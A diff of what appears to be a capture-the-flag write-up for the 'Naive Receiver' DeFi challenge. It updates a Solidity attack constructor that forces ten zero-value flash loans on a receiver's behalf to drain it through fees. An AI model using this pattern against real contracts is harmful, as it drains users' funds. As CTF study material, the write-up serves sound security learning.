@@ -23,9 +23,18 @@
 - Write a for loop that calls the lender contracts `flashLoan` function on the naive receivers behalf...10 times. Doesn't even need to borrow a value > 0.
 
 ```
-constructor(address payable poolAddress, address receiverAddress) {
+constructor(
+        address payable poolAddress,
+        address receiverAddress,
+        address token
+    ) {
         for (uint256 i = 0; i < 10; i++) {
-            NaiveReceiverLenderPool(poolAddress).flashLoan(receiverAddress, 0);
+            NaiveReceiverLenderPool(poolAddress).flashLoan(
+                IERC3156FlashBorrower(receiverAddress),
+                token,
+                0,
+                bytes("")
+            );
         }
     }
 ```
